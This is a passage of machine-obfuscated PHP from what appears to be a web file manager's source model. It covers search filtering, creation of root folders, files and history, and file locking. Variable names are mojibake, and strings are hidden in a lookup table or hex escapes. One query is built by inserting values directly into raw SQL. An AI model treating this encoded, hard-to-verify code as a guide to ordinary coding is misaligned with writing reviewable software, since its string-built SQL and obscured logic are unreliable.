!1; } return !0; } public function listSearchChildren($ş•Ş“¨ç, $ğÑîğ± = 5000) { $–µØ±õü =& $_SERVER[™¸œØ®Ü]; $Ï˜ëñ—õ = array(); $Ï¼ƒ”ğ = $this->sourceInfo($ş•Ş“¨ç); $á©ú§ŸÁ = array($–µØ±õü[588] => array($–µØ±õü[461], $Ï¼ƒ”ğ[$–µØ±õü[588]] . $Ï¼ƒ”ğ[$–µØ±õü[193]] . $–µØ±õü[620])); $ÛÖúš”Ê = $this->field($–µØ±õü[79])->where($á©ú§ŸÁ)->limit($ğÑîğ± + 1)->select(); $ûÙĞŠäŞ = is_array($ÛÖúš”Ê) ? count($ÛÖúš”Ê) : 0; if ($ûÙĞŠäŞ > $ğÑîğ±) { return $this->_listSearchChildrenNear($ş•Ş“¨ç, $ğÑîğ±); } $üµòøø = $this->field($–µØ±õü[193])->where($á©ú§ŸÁ)->select(); $Ï˜ëñ—õ = array_to_keyvalue($üµòøø, $–µØ±õü[12], $–µØ±õü[193]); return $Ï˜ëñ—õ; } private function _listSearchChildrenNear($¾‹ŒÛœ , $—˜–ïƒÎ) { $×ĞÖÀ£Ø =& $_SERVER[™¸œØ®Ü]; $ò¹†öØ = array(); $£‚ÇÏæß = array($×ĞÖÀ£Ø[192] => $¾‹ŒÛœ ); $®Šµ¯Ù¢ = $this->field($×ĞÖÀ£Ø[2272])->where($£‚ÇÏæß)->select(); $ÌâÑüÚ§ = array_to_keyvalue(array_filter_by_field($®Šµ¯Ù¢, $×ĞÖÀ£Ø[487], $×ĞÖÀ£Ø[91]), $×ĞÖÀ£Ø[12], $×ĞÖÀ£Ø[193]); $ò¹†öØ = array_merge($ò¹†öØ, array_to_keyvalue($®Šµ¯Ù¢, $×ĞÖÀ£Ø[12], $×ĞÖÀ£Ø[193])); if (!$ÌâÑüÚ§) { return $ò¹†öØ; } $£‚ÇÏæß = array($×ĞÖÀ£Ø[192] => array($×ĞÖÀ£Ø[7], $ÌâÑüÚ§)); $®Šµ¯Ù¢ = $this->field($×ĞÖÀ£Ø[2272])->where($£‚ÇÏæß)->limit($—˜–ïƒÎ)->select(); $ò¹†öØ = array_merge($ò¹†öØ, array_to_keyvalue($®Šµ¯Ù¢, $×ĞÖÀ£Ø[12], $×ĞÖÀ£Ø[193])); $ò¹†öØ = array_slice($ò¹†öØ, 0, intval($—˜–ïƒÎ)); return $ò¹†öØ; } private function _listSearchBindPinyin($ÔØ‚Ÿ»ü, &$ëæà£áñ, &$È ¡¨Ö¾) { $¼¾§•ı =& $_SERVER[™¸œØ®Ü]; if (!isset($ÔØ‚Ÿ»ü[$¼¾§•ı[2094]]) || !$ÔØ‚Ÿ»ü[$¼¾§•ı[2094]]) { return; } if (!Input::check($ÔØ‚Ÿ»ü[$¼¾§•ı[2094]], $¼¾§•ı[395]) || strlen($ÔØ‚Ÿ»ü[$¼¾§•ı[2094]]) < 2) { return; } $üî­«ü§ = "\x4c\x45\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\163\x6f\165\x72\x63\145\137\x6d\x65\x74\x61\40\155\x65\164\141\x20\x6f\x6e\x20\x73\x6f\165\x72\x63\145\x2e\163\x6f\x75\162\x63\145\x49\104\x20\75\40\x6d\145\164\x61\56\x73\x6f\165\x72\143\145\111\104"; $ÉÛšìâ£ = array(); $È ¡¨Ö¾ = str_replace(array($¼¾§•ı[287], $¼¾§•ı[53], $¼¾§•ı[2273]), $¼¾§•ı[12], $È ¡¨Ö¾); $È ¡¨Ö¾ = $¼¾§•ı[513] . str_replace($¼¾§•ı[50], $¼¾§•ı[514], $È ¡¨Ö¾); $Ñù¬‚À­ = $ëæà£áñ[$¼¾§•ı[32]]; unset($ëæà£áñ[$¼¾§•ı[32]]); foreach ($ëæà£áñ as $à£âï½Á => $®¹©ïÓî) { $ÉÛšìâ£[$¼¾§•ı[513] . $à£âï½Á] = $®¹©ïÓî; } foreach ($Ñù¬‚À­ as $˜ĞÅ¡â) { $ÉÛšìâ£[] = array($¼¾§•ı[518] => $˜ĞÅ¡â, $¼¾§•ı[1096] => $¼¾§•ı[2098], array($¼¾§•ı[2274] => $˜ĞÅ¡â, $¼¾§•ı[2275] => array($¼¾§•ı[7], array($¼¾§•ı[540], $¼¾§•ı[539])))); } $this->join($üî­«ü§); $ëæà£áñ = $ÉÛšìâ£; } private function _parseSearchWhere($½½Ûçú¬) { $Ò¹Á„¾Ï =& $_SERVER[™¸œØ®Ü]; $÷åëäöØ = array(); if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[845]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[845]]) { $÷åëäöØ[$Ò¹Á„¾Ï[88]] = array($Ò¹Á„¾Ï[2276], $½½Ûçú¬[$Ò¹Á„¾Ï[845]]); } if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[846]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[846]]) { $››Ø›†‚ = array($Ò¹Á„¾Ï[2277], $½½Ûçú¬[$Ò¹Á„¾Ï[846]]); if ($÷åëäöØ[$Ò¹Á„¾Ï[88]]) { $÷åëäöØ[$Ò¹Á„¾Ï[88]] = array($÷åëäöØ[$Ò¹Á„¾Ï[88]], $››Ø›†‚, $Ò¹Á„¾Ï[2278]); } else { $÷åëäöØ[$Ò¹Á„¾Ï[88]] = $››Ø›†‚; } } if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[2270]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[2270]] > 0) { $÷åëäöØ[$Ò¹Á„¾Ï[79]] = array($Ò¹Á„¾Ï[2276], $½½Ûçú¬[$Ò¹Á„¾Ï[2270]]); } if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[2271]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[2271]]) { $››Ø›†‚ = array($Ò¹Á„¾Ï[2277], $½½Ûçú¬[$Ò¹Á„¾Ï[2271]]); if ($÷åëäöØ[$Ò¹Á„¾Ï[79]]) { $÷åëäöØ[$Ò¹Á„¾Ï[79]] = array($÷åëäöØ[$Ò¹Á„¾Ï[79]], $››Ø›†‚, $Ò¹Á„¾Ï[2278]); } else { $÷åëäöØ[$Ò¹Á„¾Ï[79]] = $››Ø›†‚; } } if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[669]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[669]]) { $÷åëäöØ[] = array($Ò¹Á„¾Ï[531] => $½½Ûçú¬[$Ò¹Á„¾Ï[669]], $Ò¹Á„¾Ï[529] => $½½Ûçú¬[$Ò¹Á„¾Ï[669]], $Ò¹Á„¾Ï[1096] => $Ò¹Á„¾Ï[2098]); } if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[488]]) && $½½Ûçú¬[$Ò¹Á„¾Ï[488]]) { $ŠÒ›²úõ = $½½Ûçú¬[$Ò¹Á„¾Ï[488]]; if ($ŠÒ›²úõ == $Ò¹Á„¾Ï[78]) { $÷åëäöØ[$Ò¹Á„¾Ï[487]] = 1; } else { if ($ŠÒ›²úõ == $Ò¹Á„¾Ï[2279]) { $÷åëäöØ[$Ò¹Á„¾Ï[487]] = 0; } else { if ($ŠÒ›²úõ) { $ŠÒ›²úõ = is_array($ŠÒ›²úõ) ? $ŠÒ›²úõ : explode($Ò¹Á„¾Ï[50], $ŠÒ›²úõ); $÷åëäöØ[$Ò¹Á„¾Ï[488]] = array($Ò¹Á„¾Ï[494], $ŠÒ›²úõ); $÷åëäöØ[$Ò¹Á„¾Ï[487]] = 0; } } } } $this->_parseSearchParent($½½Ûçú¬, $÷åëäöØ); if (isset($½½Ûçú¬[$Ò¹Á„¾Ï[2094]]) && trim($½½Ûçú¬[$Ò¹Á„¾Ï[2094]])) { $·Üº€Üê = trim($½½Ûçú¬[$Ò¹Á„¾Ï[2094]]); $©›Ğ§çò = explode($Ò¹Á„¾Ï[53], $·Üº€Üê); if (strlen($·Üº€Üê) > 2 && (substr($·Üº€Üê, 0, 1) == $Ò¹Á„¾Ï[121] && substr($·Üº€Üê, -1) == $Ò¹Á„¾Ï[121]) || substr($·Üº€Üê, 0, 1) == $Ò¹Á„¾Ï[58] && substr($·Üº€Üê, -1) == $Ò¹Á„¾Ï[58]) { $·Üº€Üê = substr($·Üº€Üê, 1, -1); $©›Ğ§çò = array($·Üº€Üê); } $÷åëäöØ[$Ò¹Á„¾Ï[32]] = array(array($Ò¹Á„¾Ï[619], $Ò¹Á„¾Ï[2096] . $·Üº€Üê . $Ò¹Á„¾Ï[2096])); if (count($©›Ğ§çò) > 1) { $÷åëäöØ[$Ò¹Á„¾Ï[32]] = array(); foreach ($©›Ğ§çò as $Şòã¯ø») { if (!trim($Şòã¯ø»)) { continue; } $÷åëäöØ[$Ò¹Á„¾Ï[32]][] = array($Ò¹Á„¾Ï[619], $Ò¹Á„¾Ï[2096] . trim($Şòã¯ø») . $Ò¹Á„¾Ï[2096]); } } } return $÷åëäöØ; } private function _parseSearchParent($¤‚îÔÙ, &$Ëà†û¾) { $üúğÇ =& $_SERVER[™¸œØ®Ü]; if (!isset($¤‚îÔÙ[$üúğÇ[192]]) || !$¤‚îÔÙ[$üúğÇ[192]]) { return; } $š’ÎÄŒº = $this->pathInfo($¤‚îÔÙ[$üúğÇ[192]]); $¤¿·ÃÕé = $š’ÎÄŒº[$üúğÇ[192]] . $üúğÇ[12] === $üúğÇ[230]; $Óëåğ‰ò = $š’ÎÄŒº[$üúğÇ[190]] == $üúğÇ[582]; if ($š’ÎÄŒº[$üúğÇ[598]] == $üúğÇ[599]) { $Ä”Ş¶‡ = $this->sourceInfo($¤‚îÔÙ[$üúğÇ[192]]); $š’ÎÄŒº[$üúğÇ[588]] = $Ä”Ş¶‡[$üúğÇ[588]]; } $Ëà†û¾[$üúğÇ[659]] = array($üúğÇ[619], $š’ÎÄŒº[$üúğÇ[588]] . $¤‚îÔÙ[$üúğÇ[192]] . $üúğÇ[620]); $Ìøí•İ˜ = isset($¤‚îÔÙ[$üúğÇ[1954]]) && in_array($üúğÇ[582], $¤‚îÔÙ[$üúğÇ[1954]]); if (!$Ìøí•İ˜ || !$Óëåğ‰ò || !$¤¿·ÃÕé || !$š’ÎÄŒº[$üúğÇ[489]]) { return; } if (!AuthModel::authCheckRoot($š’ÎÄŒº[$üúğÇ[489]][$üúğÇ[490]])) { return; } $œ±Åõèñ = $š’ÎÄŒº[$üúğÇ[573]] . $üúğÇ[12]; if ($œ±Åõèñ == $üúğÇ[91]) { unset($Ëà†û¾[$üúğÇ[659]]); $Ëà†û¾[$üúğÇ[190]] = self::TYPE_GROUP; return; } $ƒ€ÚÅñ¿ = Model($üúğÇ[589])->groupChildrenAll($œ±Åõèñ); $„ı°ÂÇÌ = count($ƒ€ÚÅñ¿); if ($„ı°ÂÇÌ <= 1) { return; } $š£¿ áÑ = array($üúğÇ[192] => 0, $üúğÇ[190] => self::TYPE_GROUP, $üúğÇ[573] => array($üúğÇ[7], $ƒ€ÚÅñ¿)); $³¶Ù˜ğ² = $this->field($üúğÇ[2280])->where($š£¿ áÑ)->limit($„ı°ÂÇÌ)->select(); $Ëà†û¾[$üúğÇ[659]] = array(); foreach ($³¶Ù˜ğ² as $êÉ ÛÜù) { $Ëà†û¾[$üúğÇ[659]][] = array($üúğÇ[619], $üúğÇ[597] . $êÉ ÛÜù[$üúğÇ[193]] . $üúğÇ[620]); } $Ëà†û¾[$üúğÇ[659]][] = $üúğÇ[2098]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($õ©òâ ‘) { $ùñÌˆãÉ =& $_SERVER[™¸œØ®Ü]; $»‚üÌ™  = Model($ùñÌˆãÉ[581])->where(array($ùñÌˆãÉ[1786] => $õ©òâ ‘))->find(); $²•­¶§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $õ©òâ ‘, $»‚üÌ™ [$ùñÌˆãÉ[32]]); $this->userDesktopAdd($²•­¶§); return $²•­¶§; } public function userDesktopAdd($‰Í½¼é²) { $ Ö¢©‡ =& $_SERVER[™¸œØ®Ü]; $ÍÛ˜¨» = LNG($ Ö¢©‡[2281]); $¦ı¹÷ ß = $this->mkdir($‰Í½¼é², $ÍÛ˜¨»); $this->metaSet($¦ı¹÷ ß, $ Ö¢©‡[2282], $ Ö¢©‡[91]); $this->metaSet($‰Í½¼é², $ Ö¢©‡[2283], $¦ı¹÷ ß); } public function userPathSafeAdd($£ºşî‡´) { $ø–­÷‘ª =& $_SERVER[™¸œØ®Ü]; $œ»¦ºÛ = Model($ø–­÷‘ª[581])->getInfoFull($£ºşî‡´); if (!$œ»¦ºÛ) { return !1; } if (_get($œ»¦ºÛ, $ø–­÷‘ª[602])) { return $œ»¦ºÛ[$ø–­÷‘ª[543]][$ø–­÷‘ª[2284]]; } $í„öø¶ˆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $£ºşî‡´, $ø–­÷‘ª[2285], $ø–­÷‘ª[2286]); Model($ø–­÷‘ª[581])->metaSet($£ºşî‡´, $ø–­÷‘ª[2284], $í„öø¶ˆ); $this->metaSet($í„öø¶ˆ, $ø–­÷‘ª[2287], $£ºşî‡´); return $í„öø¶ˆ; } public function userPathAppAdd($Ô×éØÔ¯, $‹º¡¨”è = '', $±ëĞÄÈë = '') { $Ö¥´Ö“ä =& $_SERVER[™¸œØ®Ü]; $É¹æ¶È = Model($Ö¥´Ö“ä[581])->getInfoFull($Ô×éØÔ¯); if (!$É¹æ¶È) { return !1; } $Òì™§Øİ = $É¹æ¶È[$Ö¥´Ö“ä[543]] ? $É¹æ¶È[$Ö¥´Ö“ä[543]] : array(); $ÊİŒ¨÷É = $Òì™§Øİ[$Ö¥´Ö“ä[2288]]; if (!$ÊİŒ¨÷É) { $ÊİŒ¨÷É = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ô×éØÔ¯, $Ö¥´Ö“ä[2289], $Ö¥´Ö“ä[2290]); Model($Ö¥´Ö“ä[581])->metaSet($Ô×éØÔ¯, $Ö¥´Ö“ä[2288], $ÊİŒ¨÷É . $Ö¥´Ö“ä[12]); $this->metaSet($ÊİŒ¨÷É, $Ö¥´Ö“ä[2288], $Ô×éØÔ¯); } if (!$‹º¡¨”è) { return $ÊİŒ¨÷É; } $ŞÏÇßàÓ = $Òì™§Øİ[$Ö¥´Ö“ä[2291] . $‹º¡¨”è]; if (!$ŞÏÇßàÓ) { $ŞÏÇßàÓ = $this->mkdir($ÊİŒ¨÷É, $‹º¡¨”è); Model($Ö¥´Ö“ä[581])->metaSet($Ô×éØÔ¯, $Ö¥´Ö“ä[2291] . $‹º¡¨”è, $ŞÏÇßàÓ); $this->metaSet($ŞÏÇßàÓ, $Ö¥´Ö“ä[2291] . $‹º¡¨”è, $Ô×éØÔ¯); } if (!$±ëĞÄÈë) { return $ŞÏÇßàÓ; } $™ªÑãÁ§ = $this->mkdir($ŞÏÇßàÓ, $±ëĞÄÈë); return $™ªÑãÁ§; } public function groupRootAdd($ò›Ã†àÕ) { $æô³ñÜ® =& $_SERVER[™¸œØ®Ü]; $üƒ±•«™ = Model($æô³ñÜ®[589])->where(array($æô³ñÜ®[2088] => $ò›Ã†àÕ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ò›Ã†àÕ, $üƒ±•«™[$æô³ñÜ®[32]]); } public function systemRootPathAdd($Ãò‹ÇĞµ) { if ($Ãò‹ÇĞµ != $_SERVER[™¸œØ®Ü][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ãò‹ÇĞµ); } public function userRootRemove($—æ”² –) { $Ö”ëšœŠ = $this->targetSourceRoot(SourceModel::TYPE_USER, $—æ”² –, !0); foreach ($Ö”ëšœŠ as $¦¢Œ›¨á) { if (!$¦¢Œ›¨á) { continue; } $this->remove($¦¢Œ›¨á[$_SERVER[™¸œØ®Ü][193]], !1); } } public function groupRootRemove($ŠÁ«…¨´) { $³Ä«™¶ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ŠÁ«…¨´); if (!$³Ä«™¶) { return; } $this->remove($³Ä«™¶[$_SERVER[™¸œØ®Ü][193]], !1); } private function _mkdirRoot($„ıÂñÏø, $÷ªû¹Òã, $¼ºÙ¶£Ó, $ËÆŠ¢Ô° = '') { $¨…Ô¼á– =& $_SERVER[™¸œØ®Ü]; $±¤‹š = defined($¨…Ô¼á–[2226]) ? USER_ID : 0; $»Ç£øœÆ = array($¨…Ô¼á–[479] => 0, $¨…Ô¼á–[655] => $„ıÂñÏø, $¨…Ô¼á–[656] => $÷ªû¹Òã, $¨…Ô¼á–[653] => 1, $¨…Ô¼á–[657] => $±¤‹š, $¨…Ô¼á–[658] => $±¤‹š, $¨…Ô¼á–[654] => $ËÆŠ¢Ô°, $¨…Ô¼á–[659] => $¨…Ô¼á–[597], $¨…Ô¼á–[506] => 0, $¨…Ô¼á–[624] => 0, $¨…Ô¼á–[546] => 0, $¨…Ô¼á–[660] => $¨…Ô¼á–[12]); if ($ªİÒÜ¡ = $this->where($»Ç£øœÆ)->find()) { return $ªİÒÜ¡[$¨…Ô¼á–[193]]; } $ñßÙñ¾¿ = "\115\x6f\144\x65\154\123\157\165\x72\143\x65\56\x6d\153\x64\151\162\x52\x6f\x6f\x74\x2e{$„ıÂñÏø}\x2e{$÷ªû¹Òã}\56" . $¼ºÙ¶£Ó; CacheLock::lock($ñßÙñ¾¿); $»Ç£øœÆ[$¨…Ô¼á–[32]] = $¼ºÙ¶£Ó; $ÓŞ¥øÓí = $this->add($»Ç£øœÆ); $šÁ¦ó„ = array($¨…Ô¼á–[661] => short_id($ÓŞ¥øÓí)); $this->where(array($¨…Ô¼á–[493] => $ÓŞ¥øÓí))->save($šÁ¦ó„); CacheLock::unlock($ñßÙñ¾¿); return $ÓŞ¥øÓí; } private function targetSourceRoot($ŸôÕè¾Õ, $ô±’É°, $ÉØÓ‹Ÿœ = false) { $áòŠ†Úí =& $_SERVER[™¸œØ®Ü]; $Á½µ˜Ùé = array($áòŠ†Úí[479] => 0, $áòŠ†Úí[655] => $ŸôÕè¾Õ, $áòŠ†Úí[656] => $ô±’É°); if ($ÉØÓ‹Ÿœ) { $òğİ‹« = $this->where($Á½µ˜Ùé)->select(); return $òğİ‹« ? $òğİ‹« : array(); } $ğà…ğ‰Í = $this->where($Á½µ˜Ùé)->find(); return $ğà…ğ‰Í ? $ğà…ğ‰Í : array(); } public function sourceRootGroup($¨‡ĞÌŸ) { $‚¿±ÔŸ× =& $_SERVER[™¸œØ®Ü]; if (is_string($¨‡ĞÌŸ)) { $¨‡ĞÌŸ = array($¨‡ĞÌŸ); } $ç†¼ˆÒ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¨‡ĞÌŸ, $‚¿±ÔŸ×[222]); $Ù‹öÙÕ¯ = array($‚¿±ÔŸ×[447] => $ç†¼ˆÒ, $‚¿±ÔŸ×[444] => array($‚¿±ÔŸ×[843] => count($¨‡ĞÌŸ))); $this->_listDataApply($Ù‹öÙÕ¯[$‚¿±ÔŸ×[447]]); $this->_listMake($Ù‹öÙÕ¯); return array_to_keyvalue($Ù‹öÙÕ¯[$‚¿±ÔŸ×[85]], $‚¿±ÔŸ×[573]); } public function mkfile($š¡ºëŒ, $Ë–³¹ó», $à¾‹– = '', $—ë”æ·¦ = REPEAT_RENAME) { $ØÈï„ëã =& $_SERVER[™¸œØ®Ü]; $ÉÜûß‹ = Model($ØÈï„ëã[681])->addFileByContent($à¾‹–, $Ë–³¹ó»); return $this->_createFileCall($š¡ºëŒ, $Ë–³¹ó», $ÉÜûß‹, $—ë”æ·¦, $ØÈï„ëã[1450]); } public function addFile($§çñáë‘, $ø¥ë , $ÖÎêìõØ, $ó—‹¥ì½ = false, $³øÔŞ÷ä = REPEAT_RENAME) { $ĞİŒÆ´· = Model($_SERVER[™¸œØ®Ü][681])->addFile($ø¥ë , $ÖÎêìõØ, $ó—‹¥ì½); return $this->_createFileCall($§çñáë‘, $ÖÎêìõØ, $ĞİŒÆ´·, $³øÔŞ÷ä); } public function addFileByFileID($Æòí“²¡, $©öÅ‚µÔ, $Ø€êı«¶, $Â ¿¶Üó = REPEAT_RENAME) { $ìÎÁô§å =& $_SERVER[™¸œØ®Ü]; $ï¤Ã°¬õ = Model($ìÎÁô§å[681])->find($©öÅ‚µÔ); Model($ìÎÁô§å[681])->linkAdd($©öÅ‚µÔ); return $this->_createFileCall($Æòí“²¡, $Ø€êı«¶, $ï¤Ã°¬õ, $Â ¿¶Üó); } public function addFileByRemote($‰«Œ«, $ú¢ƒÙÉ, $È®ñ†ò·, $·²áÁê§ = array(), $ÄşÌ†¿ª = REPEAT_RENAME) { $Şšæ³ = Model($_SERVER[™¸œØ®Ü][681])->addFileByRemote($ú¢ƒÙÉ, $È®ñ†ò·, $·²áÁê§); return $this->_createFileCall($‰«Œ«, $È®ñ†ò·, $Şšæ³, $ÄşÌ†¿ª); } private function _createFileCall($ó¸¤¾Ìş, $äı¸¡ˆÏ, $Õïá‡‰ë, $éñâÌæ©, $Í¼€éà = "\165\x70\154\157\141\144") { $±óˆäó =& $_SERVER[™¸œØ®Ü]; if (!$Õïá‡‰ë) { return !1; } $¢·ê¢Áˆ = !1; $this->setMasterDB(); $this->lockWriteStart($ó¸¤¾Ìş, $äı¸¡ˆÏ); $Ş¦ªºİĞ = $this->fileNameExist($ó¸¤¾Ìş, $äı¸¡ˆÏ); $ç¤¼§›¹ = $this->_createFile($ó¸¤¾Ìş, $äı¸¡ˆÏ, $Õïá‡‰ë, $éñâÌæ©, $¢·ê¢Áˆ); if (!$¢·ê¢Áˆ) { Model($±óˆäó[548])->remove($Õïá‡‰ë[$±óˆäó[545]]); } if ($¢·ê¢Áˆ && $ç¤¼§›¹ && $ç¤¼§›¹ != $Ş¦ªºİĞ) { Model($±óˆäó[2253])->eventCreate($ç¤¼§›¹, $Í¼€éà); } $this->lockWriteEnd($ó¸¤¾Ìş, $äı¸¡ˆÏ); return $ç¤¼§›¹; } public function mkdir($è ıœşª, $‘›ÏïÒË, $š€üã¦ = REPEAT_SKIP) { $Î”‘íæ„ =& $_SERVER[™¸œØ®Ü]; $this->setMasterDB(); $ÍØ“°Ÿ× = $this->sourceInfo($è ıœşª); if (!$ÍØ“°Ÿ×) { return !1; } $this->lockWriteStart($è ıœşª, $‘›ÏïÒË); if ($š€üã¦ !== !1) { $¢¦‰éæ± = $this->fileNameExist($è ıœşª, $‘›ÏïÒË); if ($¢¦‰éæ± && $š€üã¦ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($è ıœşª, $‘›ÏïÒË); return $¢¦‰éæ±; } $‘›ÏïÒË = $this->fileNameAuto($è ıœşª, $‘›ÏïÒË, $š€üã¦); } $ªşÂ‹Û° = array($Î”‘íæ„[653] => 1, $Î”‘íæ„[496] => $‘›ÏïÒË, $Î”‘íæ„[654] => $Î”‘íæ„[12], $Î”‘íæ„[546] => 0, $Î”‘íæ„[624] => 0); $–¡ÚùÀÂ = $this->_addSource($ªşÂ‹Û°, $ÍØ“°Ÿ×); Model($Î”‘íæ„[2253])->eventCreate($–¡ÚùÀÂ, $Î”‘íæ„[1451]); $this->lockWriteEnd($è ıœşª, $‘›ÏïÒË); return $–¡ÚùÀÂ; } public function listSourceRoot($ŞßŠªñ, $©›²ŞÌ—, $’œÅ·¨˜ = "\x73\157\x75\162\x63\145\111\104\x2c\x74\x61\x72\147\145\164\111\x44\54\163\x69\x7a\x65") { $š¯Ÿ£¯ï =& $_SERVER[™¸œØ®Ü]; $…¬¯ì  = $š¯Ÿ£¯ï[456]; $û¹ûºêĞ = array(); $ÈĞ§¿óÑ = 1024 * 50; $ê’å¯ä = is_array($ê’å¯ä) ? $ê’å¯ä : array(); $°ô«‹Æ = count($©›²ŞÌ—); $ı‹å²ë = $this->tablePrefix . $š¯Ÿ£¯ï[2292]; for ($ºİø¡ÒÒ = 0; $ºİø¡ÒÒ < $°ô«‹Æ; $ºİø¡ÒÒ++) { $á£½éÉè = $©›²ŞÌ—[$ºİø¡ÒÒ]; $…¬¯ì  .= "\123\105\114\105\103\124\x20\52\x20\x46\x52\117\x4d\40\x28\123\105\114\105\x43\124\x20{$’œÅ·¨˜}\x20\x46\122\117\x4d\40\140{$ı‹å²ë}\x60\x20\x57\x48\105\122\105\x20"; $…¬¯ì  .= "\140\x70\141\162\x65\x6e\164\111\104\140\x3d\60\x20\101\116\x44\x20\x60\164\x61\162\x67\145\164\x49\x44\x60\75{$á£½éÉè}\40\x41\116\x44\40\140\x74\x61\162\147\145\x74\124\x79\x70\x65\x60\x3d{$ŞßŠªñ}\x20\141\x6e\144\40\146\151\x6c\145\x54\171\x70\145\75\x27\x27\x20\154\x69\x6d\x69\164\40\x31\51\x20\141\163\x20\164\x62\x5f{$ºİø¡ÒÒ}\x20\x55\116\x49\x4f\116\x20\101\114\114\x20"; if ((strlen($…¬¯ì ) >= $ÈĞ§¿óÑ || $ºİø¡ÒÒ == $°ô«‹Æ - 1) && $…¬¯ì ) { $…¬¯ì  = substr($…¬¯ì , 0, -strlen($š¯Ÿ£¯ï[1134])); $ïÅÔ¾¯¥ = $this->query($…¬¯ì ); $…¬¯ì  = $š¯Ÿ£¯ï[12]; $û¹ûºêĞ = array_merge($û¹ûºêĞ, $ïÅÔ¾¯¥); } } return $û¹ûºêĞ; } private function _createFile($õÈ¾å•ß, $×æ„™ğ, $æõà®í‚, $‘ÔçÎ‹ü, &$£š´ì¼Š) { $‡êÂß =& $_SERVER[™¸œØ®Ü]; $íûÈ¢Ì = $this->sourceInfo($õÈ¾å•ß); if (!$æõà®í‚ || !$íûÈ¢Ì) { return !1; } if ($‘ÔçÎ‹ü !== !1) { $ÈºŠûã = $this->fileNameExist($õÈ¾å•ß, $×æ„™ğ); } $£š´ì¼Š = !0; if ($‘ÔçÎ‹ü && $ÈºŠûã) { if ($‘ÔçÎ‹ü == REPEAT_SKIP) { $£š´ì¼Š = !1; return $ÈºŠûã; } else { if ($‘ÔçÎ‹ü == REPEAT_REPLACE) { $”Íñ¦¯“ = $this->sourceInfo($ÈºŠûã); $¿¢µ©Œ = $this->fileHistory($”Íñ¦¯“, $æõà®í‚[$‡êÂß[545]], $æõà®í‚[$‡êÂß[79]]); if (!$¿¢µ©Œ) { $£š´ì¼Š = !1; } else { $this->folderSizeReset($õÈ¾å•ß); } return $ÈºŠûã; } else { $×æ„™ğ = $this->fileNameAuto($õÈ¾å•ß, $×æ„™ğ, $‘ÔçÎ‹ü, !1); } } } $á”¿–¬¿ = array($‡êÂß[653] => 0, $‡êÂß[496] => $×æ„™ğ, $‡êÂß[654] => substr(get_path_ext($×æ„™ğ), 0, 10), $‡êÂß[546] => $æõà®í‚[$‡êÂß[545]], $‡êÂß[624] => $æõà®í‚[$‡êÂß[79]]); $ú×ÄÕÂ = $this->_addSource($á”¿–¬¿, $íûÈ¢Ì); $this->folderSizeReset($õÈ¾å•ß, intval($á”¿–¬¿[$‡êÂß[79]])); return $ú×ÄÕÂ; } protected function fileHistory($‹ùø½Ô, $ÒÍŞÀ¶, $ªí˜Ó€°) { $™Ä‡¥çØ =& $_SERVER[™¸œØ®Ü]; if ($‹ùø½Ô[$™Ä‡¥çØ[545]] == $ÒÍŞÀ¶) { return !1; } $this->checkLock($‹ùø½Ô[$™Ä‡¥çØ[193]], $ÒÍŞÀ¶); Model($™Ä‡¥çØ[2293])->addHistory($‹ùø½Ô); $—ğÏİ¤† = array($™Ä‡¥çØ[658] => USER_ID, $™Ä‡¥çØ[500] => time(), $™Ä‡¥çØ[545] => $ÒÍŞÀ¶, $™Ä‡¥çØ[79] => $ªí˜Ó€°); $this->where(array($™Ä‡¥çØ[493] => $‹ùø½Ô[$™Ä‡¥çØ[193]]))->save($—ğÏİ¤†); $this->sourceCacheClear($‹ùø½Ô[$™Ä‡¥çØ[193]]); return !0; } public function checkLock($ùĞˆó×Ä, $‰Œã¢û) { $ãŠ¤‹İ =& $_SERVER[™¸œØ®Ü]; $å¨Úğ’ = $this->pathInfo($ùĞˆó×Ä); if (!$this->fileIsLock($å¨Úğ’, !0)) { return; } $€¸Ì¤ÈÊ = Session::get($ãŠ¤‹İ[2294]); $ñî‹‚¹ = substr($å¨Úğ’[$ãŠ¤‹İ[32]], 0, -1 - strlen($å¨Úğ’[$ãŠ¤‹İ[169]])) . $ãŠ¤‹İ[1312] . $€¸Ì¤ÈÊ . $ãŠ¤‹İ[10] . $å¨Úğ’[$ãŠ¤‹İ[169]]; $Œ²ı¹½ = Model($ãŠ¤‹İ[681])->find($‰Œã¢û); $this->_createFileCall($å¨Úğ’[$ãŠ¤‹İ[192]], $ñî‹‚¹, $Œ²ı¹½, REPEAT_REPLACE, $ãŠ¤‹İ[1450]); $áÇ´°ª‹ = $å¨Úğ’[$ãŠ¤‹İ[543]][$ãŠ¤‹İ[617]]; $îû¼Å˜… = $áÇ´°ª‹[$ãŠ¤‹İ[2295]] ? $áÇ´°ª‹[$ãŠ¤‹İ[2295]] : $áÇ´°ª‹[$ãŠ¤‹İ[32]]; show_json(LNG($ãŠ¤‹İ[2296]) . $ãŠ¤‹İ[2297] . LNG($ãŠ¤‹İ[2298]) . $ãŠ¤‹İ[2299] . $îû¼Å˜… . $ãŠ¤‹İ[2300], !1); } public function fileIsLock($úŸ´Ç»Œ, $¶ ïÛ‚ = false) { $‡âî¾ÙÂ =& $_SERVER[™¸œØ®Ü]; if (!_get($úŸ´Ç»Œ, $‡âî¾ÙÂ[613], 0)) { return !1; } if ($úŸ´Ç»Œ[$‡âî¾ÙÂ[543]][$‡âî¾ÙÂ[616]] != USER_ID) { return !0; } $…Ş÷¥§ë = 